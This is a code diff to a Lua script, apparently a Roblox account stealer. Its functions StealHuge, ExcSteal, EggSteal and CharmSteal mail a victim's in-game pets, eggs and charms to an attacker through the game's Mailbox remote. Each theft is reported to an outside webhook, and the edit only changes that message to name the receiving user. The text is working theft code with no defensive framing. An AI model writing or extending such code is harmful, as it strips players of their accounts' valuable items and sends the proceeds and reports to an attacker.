@@ -87,7 +87,7 @@ function StealHuge()
                 [5] = v._am or 1
             }
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. id .. " has been sent to your mail")
+			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
 			local finalHuges = CountHuges()
 			if finalHuges < initialHuges then
 				hugesSent = hugesSent + 1
@@ -140,7 +140,7 @@ function ExcSteal()
                 [5] = v._am or 1
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. id .. " has been sent to your mail")
+			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
 			local finalExc = CountExc()
 			if finalExc < initialExc then
 				excSent = excSent + 1
@@ -184,7 +184,7 @@ function EggSteal()
 				[5] = v._am or 1
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. id .. " has been sent to your mail")
+			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
 		end
     end
 end
@@ -202,7 +202,7 @@ function CharmSteal()
 				[5] = v._am or 1
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. id .. " has been sent to your mail")
+			SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
 		end
     end
 end
